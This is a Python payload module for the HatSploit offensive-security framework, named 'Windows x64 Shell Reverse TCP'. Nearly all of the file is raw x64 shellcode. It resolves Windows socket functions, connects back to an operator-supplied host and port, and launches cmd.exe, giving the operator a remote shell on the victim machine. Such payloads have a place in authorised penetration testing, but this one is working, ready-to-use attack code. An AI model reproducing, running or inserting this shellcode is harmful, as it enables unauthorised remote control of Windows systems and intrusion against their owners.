"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.payload.basic import *


class HatSploitPayload(Payload, ReverseTCPHandler):
    def __init__(self):
        super().__init__({
            'Name': "Windows x64 Shell Reverse TCP",
            'Payload': "windows/x64/shell_reverse_tcp",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - payload developer',
            ],
            'Description': "Reverse shell TCP payload for Windows x64.",
            'Arch': ARCH_X64,
            'Platform': OS_WINDOWS,
        })

    def run(self):
        return (
                b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00"
                b"\x00\x41\x51\x41\x50\x52\x51\x56\x48"
                b"\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b"
                b"\x52\x18\x48\x8b\x52\x20\x48\x8b\x72"
                b"\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
                b"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c"
                b"\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
                b"\xed\x52\x41\x51\x48\x8b\x52\x20\x8b"
                b"\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00"
                b"\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
                b"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20"
                b"\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41"
                b"\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9"
                b"\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
                b"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
                b"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
                b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
                b"\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0"
                b"\x41\x8b\x04\x88\x48\x01\xd0\x41\x58"
                b"\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
                b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff"
                b"\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
                b"\x57\xff\xff\xff\x5d\x49\xbe\x77\x73"
                b"\x32\x5f\x33\x32\x00\x00\x41\x56\x49"
                b"\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
                b"\x49\x89\xe5\x49\xbc\x02\x00"
                + self.rhost.little
                + self.rport.little
                + b"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41"
                  b"\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89"
                  b"\xea\x68\x01\x01\x00\x00\x59\x41\xba"
                  b"\x29\x80\x6b\x00\xff\xd5\x50\x50\x4d"
                  b"\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48"
                  b"\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
                  b"\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89"
                  b"\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48"
                  b"\x89\xf9\x41\xba\x99\xa5\x74\x61\xff"
                  b"\xd5\x48\x81\xc4\x40\x02\x00\x00\x49"
                  b"\xb8\x63\x6d\x64\x00\x00\x00\x00\x00"
                  b"\x41\x50\x41\x50\x48\x89\xe2\x57\x57"
                  b"\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50"
                  b"\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
                  b"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48"
                  b"\x89\xe6\x56\x50\x41\x50\x41\x50\x41"
                  b"\x50\x49\xff\xc0\x41\x50\x49\xff\xc8"
                  b"\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79"
                  b"\xcc\x3f\x86\xff\xd5\x48\x31\xd2\x48"
                  b"\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d"
                  b"\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x41"
                  b"\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83"
                  b"\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
                  b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00"
                  b"\x59\x41\x89\xda\xff\xd5"
        )
